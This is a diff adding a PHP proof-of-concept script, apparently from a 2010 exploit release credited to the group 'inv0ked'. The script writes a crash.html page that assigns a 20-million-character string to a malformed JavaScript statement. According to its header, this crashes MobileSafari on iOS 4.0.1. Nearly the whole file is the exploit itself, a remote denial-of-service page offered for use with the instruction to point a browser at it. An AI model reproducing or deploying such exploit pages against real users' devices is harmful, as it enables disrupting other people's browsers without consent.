@@ -1,0 +1,46 @@
+<?php
+#     _             ____  __            __    ___ 
+#    (_)____ _   __/ __ \/ /_____  ____/ /  _/_/ |
+#   / // __ \ | / / / / / //_/ _ \/ __  /  / / / /
+#  / // / / / |/ / /_/ / ,< /  __/ /_/ /  / / / / 
+# /_//_/ /_/|___/\____/_/|_|\___/\__,_/  / /_/_/  
+#                   Live by the byte     |_/_/  
+#
+# Members:
+#
+# Pr0T3cT10n
+# -=M.o.B.=-
+# TheLeader
+# Sro
+# Debug
+#
+# Contact: inv0ked.israel@gmail.com
+#
+# -----------------------------------
+# The following code is a proof of concept for a crash vulnerability that exists in 'Apple iPhone MobileSafari'.
+# Point your browser to the created file (crash.html) and see what happen ;)
+# The vulnerable function is:
+# * . = "A X 20000120";
+# -----------------------------------
+# Exploit Title: Apple iPhone Safari (JS '.' / dot) Remote Crash
+# Date: 21/12/2010
+# Author: Pr0T3cT10n
+# Affected Version: IOS 4.0.1
+# Tested on Apple iPhone 3GS, IOS 4.0.1, MobileSafari
+# Launch Safari, point your browser to the page and safari will crash.
+# ISRAEL, NULLBYTE.ORG.IL
+$string = str_repeat('A', 20000120);
+$code 	= "<html>
+	<head>
+		<title>Apple iPhone 3 Safari (JavaScript - dot / '.') Remote Crash</title>
+	</head>
+	<script type='text/javascript'>
+		. = '{$string}';
+	</script>
+</html>";
+if(file_put_contents("./crash.html", $code)) {
+	echo("Point your safari mobile browser to `crash.html`.\r\n");
+} else {
+	echo("Cannot create file.\r\n");
+}
+?>
